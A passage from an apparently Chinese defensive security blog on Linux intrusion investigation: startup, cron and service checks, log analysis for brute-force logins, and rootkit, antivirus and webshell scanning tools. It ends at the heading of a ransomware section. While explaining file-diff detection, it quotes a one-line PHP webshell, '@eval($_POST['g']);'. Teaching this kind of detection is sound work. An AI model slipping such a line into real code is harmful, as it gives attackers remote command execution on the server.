<code>runlevel</code></p><p>系统默认允许级别</p><pre><code>vi  /etc/inittabid=3：initdefault  #系统开机后直接进入哪个运行级别</code></pre><p>开机启动配置文件</p><pre><code>/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。</p><p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p><pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></pre><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br><span class="line">ls -l /etc/rc.d/rc3.d/</span><br></pre></td></tr></table></figure><h4 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h4><p><strong>基本使用</strong></p><p>1、利用 crontab 创建计划任务</p><ul><li><p>基本命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line"></span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</span><br><span class="line"></span><br><span class="line">crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line"></span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br><span class="line"></span><br><span class="line">如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件</span><br></pre></td></tr></table></figure></li></ul><p>2、利用 anacron 命令实现异步定时任务调度</p><ul><li><p>使用案例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每天运行 /home/backup.sh 脚本：</span><br><span class="line">vi /etc/anacrontab </span><br><span class="line">@daily    10    example.daily   /bin/bash /home/backup.sh</span><br><span class="line">当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</span><br></pre></td></tr></table></figure></li></ul><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><pre><code>/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*</code></pre><p>小技巧：</p><pre><code>more /etc/cron.daily/*  查看目录下所有文件</code></pre><h4 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h4><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]chkconfig –level  2345 httpd on  开启自启动chkconfig httpd on （默认level是2345）</code></pre><p>第二种修改方法：</p><pre><code>修改 /etc/re.d/rc.local 文件  加入 /etc/init.d/httpd start</code></pre><p>第三种修改方法：</p><p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM 包安装的服务</p><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务系统在3与5级别下的启动项 中文环境chkconfig --list | grep &quot;3:启用\|5:启用&quot;英文环境chkconfig --list | grep &quot;3:on\|5:on&quot;</code></pre><p>源码包安装的服务</p><pre><code>查看服务安装位置 ，一般是在/user/local/service httpd start搜索/etc/rc.d/init.d/  查看是否存在</code></pre><h4 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h4><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>​    可以使用find命令来查找，如  find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p><h4 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h4><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>日志分析技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： </span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure><h3 id="0x02-工具篇-1"><a href="#0x02-工具篇-1" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h4><ul><li><p>chkrootkit  </p><p>网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-2-病毒查杀-1"><a href="#2-2-病毒查杀-1" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><ul><li><p>Clamav</p><p>网址：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a> </p><p>安装方式一： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装 zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz </span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组 clamav 和组成员 clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装 Clamav</span><br><span class="line">tar –zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置 Clamav</span><br><span class="line">mkdir /opt/clamav/logs</span><br><span class="line">mkdir /opt/clamav/updata</span><br><span class="line">touch /opt/clamav/logs/freshclam.log</span><br><span class="line">touch /opt/clamav/logs/clamd.log</span><br><span class="line">cd /opt/clamav/logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan –h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户的主目录就使用</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></figure><p>安装方式二： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h4><p>Linux 版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">河马 WebShell 查杀：http://www.shellpub.com</span><br></pre></td></tr></table></figure><h4 id="2-4-RPM-check-检查"><a href="#2-4-RPM-check-检查" class="headerlink" title="2.4 RPM check 检查"></a>2.4 RPM check 检查</h4><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">S         文件大小是否改变</span><br><span class="line">M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">D         设备中，从代码是否改变</span><br><span class="line">L         文件路径是否改变</span><br><span class="line">U         文件的属主（所有者）是否改变</span><br><span class="line">G         文件的属组是否改变</span><br><span class="line">T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure><p>如果命令被替换了，如果还原回来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下</span><br><span class="line">cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失</span><br></pre></td></tr></table></figure><h4 id="2-5-Linux安全检查脚本"><a href="#2-5-Linux安全检查脚本" class="headerlink" title="2.5 Linux安全检查脚本"></a>2.5 Linux安全检查脚本</h4><p>Github 项目地址：</p><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p><h2 id="常见的-Webshell-查杀工具"><a href="#常见的-Webshell-查杀工具" class="headerlink" title="常见的 Webshell 查杀工具"></a>常见的 Webshell 查杀工具</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p><p>本文推荐了10款 WebShll 检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种 WebShell 检测能力，比如阿里云、青藤云、safedog 等，本文暂不讨论。</p><hr><p><strong>1、D盾_Web查杀</strong></p><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。</p><p>兼容性：只提供 Windows 版本。</p><p>工具下载地址：<a href="http://www.d99net.net/">http://www.d99net.net</a></p><p><img src="/image/media/2022/secops/20200407-1.png"></p><p><strong>2、百度 WEBDIR+</strong></p><p>下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p><p>兼容性：提供在线查杀木马，免费开放 API 支持批量检测。</p><p>在线查杀地址：<a href="https://scanner.baidu.com/">https://scanner.baidu.com</a></p><p><img src="/image/media/2022/secops/20200407-2.png"></p><p><strong>3、河马</strong></p><p>专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p><p>兼容性：支持 Windows、Linux，支持在线查杀。</p><p>官方网站：<a href="https://www.shellpub.com/">https://www.shellpub.com</a></p><p><img src="/image/media/2022/secops/20200407-3.png"></p><p><strong>4、Web Shell Detector</strong></p><p>Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。</p><p>兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。</p><p>官方网站：<a href="http://www.shelldetector.com/">http://www.shelldetector.com</a></p><p>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p><p><img src="/image/media/2022/secops/20200407-4.png"></p><p><strong>5、CloudWalker（牧云）</strong></p><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p><p>兼容性：提供 Linux版本，Windows 暂不支持。</p><p>在线查杀 demo：<a href="https://webshellchop.chaitin.cn/">https://webshellchop.chaitin.cn</a></p><p>GitHub 项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a></p><p><img src="/image/media/2022/secops/20200407-5.png"></p><p><strong>6、Sangfor WebShellKill</strong></p><p>Sangfor WebShellKill (网站后门检测工具)是一款 Web 后门专杀工具，不仅支持 WebShell 的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p><p>兼容性：支持 Windows、linux</p><p>工具下载地址：<a href="http://edr.sangfor.com.cn/backdoor_detection.html%EF%BC%88%E5%B7%B2%E5%81%9C%E6%AD%A2%E8%AE%BF%E9%97%AE%EF%BC%89">http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）</a></p><p><img src="/image/media/2022/secops/20200407-6.png"></p><p><strong>7、深度学习模型检测 PHP Webshell</strong></p><p>一个深度学习 PHP WebShell 查杀引擎 demo，提供在线样本检测。</p><p>在线查杀地址：<a href="http://webshell.cdxy.me/">http://webshell.cdxy.me</a></p><p><img src="/image/media/2022/secops/20200407-7.png"></p><p><strong>8、PHP Malware Finder</strong></p><p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p><p>兼容性：提供Linux 版本，Windows 暂不支持。</p><p>GitHub 项目地址：<a href="https://github.com/jvoisin/php-malware-finder">https://github.com/jvoisin/php-malware-finder</a></p><p><img src="/image/media/2022/secops/20200407-8.png"></p><p><strong>9、findWebshell</strong></p><p>这个项目是一款基于 Python 开发的 WebShell 检查工具，可以根据特征码匹配检查任意类型的 WebShell 后门。</p><p>GitHub 项目地址：<a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p><img src="/image/media/2022/secops/20200407-9.png"></p><p><strong>10、在线 WebShell 查杀工具</strong></p><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell">http://tools.bugscaner.com/killwebshell</a></p><p><img src="/image/media/2022/secops/20200407-10.png"></p><h2 id="如何发现隐藏的-Webshell-后门"><a href="#如何发现隐藏的-Webshell-后门" class="headerlink" title="如何发现隐藏的 Webshell 后门"></a>如何发现隐藏的 Webshell 后门</h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>如何在百万行代码里发现隐藏的后门？</p><p>试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。</p><p>即使是一款拥有 99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。</p><p>最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p><p>本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。</p><hr><p><strong>1、文件 MD5 校验</strong></p><p>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个 exe 可执行文件，还有一个文件 md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的”特征值”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip</span><br><span class="line">文件 MD5：29285decadbce3918a4f8429ec33df46   WebShellKill.exe</span><br></pre></td></tr></table></figure><p>当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。</p><p>那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash 值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。</p><p>文件 hash 值计算：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def md5sum(file):</span><br><span class="line">    m=hashlib.md5()</span><br><span class="line">    if os.path.isfile(file):</span><br><span class="line">        f=open(file,&#x27;rb&#x27;)</span><br><span class="line">        for line in f:</span><br><span class="line">            m.update(line)</span><br><span class="line">        f.close</span><br><span class="line">    else:</span><br><span class="line">        m.update(file)</span><br><span class="line">    return (m.hexdigest())</span><br></pre></td></tr></table></figure><p>对文件进行哈希值重新计算，进行校验对比，测试效果：</p><p><img src="/image/media/2022/secops/20200411-1.png"></p><p>如上图，在上传目录新增了一个 evil.php 文件，还有一个被篡改的文件是 low.php 。使用常见的编辑器 Notepad++ 进行对比，可以发现 low.php 文件里被插入了一句话 WebShell。</p><p><img src="/image/media/2022/secops/20200411-2.png"></p><p><strong>2、diff 命令</strong></p><p>在 Linux 中，我们经常使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff -c -a -r cms1 cms2</span><br></pre></td></tr></table></figure><p>如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现 low.php 文件被篡改过，篡改的内容是 <code>@eval($_POST[&#39;g&#39;]);</code></p><p><img src="/image/media/2022/secops/20200411-3.png"></p><p>备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。</p><p><strong>3、版本控制工具</strong></p><p>版本控制工具，比如说 git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。</p><p>另外，也可以通过 git diff 用来比较文件之间的不同。</p><p><img src="/image/media/2022/secops/20200411-4.png"></p><p><strong>4、文件对比工具</strong></p><p>关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。</p><p><strong>Beyond Compare</strong></p><p>Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。</p><p>下载地址：<a href="http://www.scootersoftware.com/download.php">http://www.scootersoftware.com/download.php</a></p><p>软件使用示例，通过文件夹比较，找出文件夹中的差异内容。</p><p>1、双击 Beyond Compare ，打开软件主页，选择文件夹比较。</p><p><img src="/image/media/2022/secops/20200411-5.png"></p><p>2、在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。</p><p><img src="/image/media/2022/secops/20200411-6.png"></p><p>3、双击具体文件，进入代码对比，找到代码差异部分。</p><p><img src="/image/media/2022/secops/20200411-7.png"></p><p><strong>WinMerge</strong></p><p>WinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。</p><p>下载地址：<a href="https://winmerge.org/downloads/">https://winmerge.org/downloads/</a></p><p>1、文件 – 打开，选择文件或文件夹，然后点击进行比较。</p><p><img src="/image/media/2022/secops/20200411-8.png"></p><p>2、在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。</p><p><img src="/image/media/2022/secops/20200411-9.png"></p><h2 id="勒索病毒自救指南"><a href="#勒索病毒自救指南" class="headerlink" title="勒索病毒自救指南"></a>勒索病毒自救指南</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" 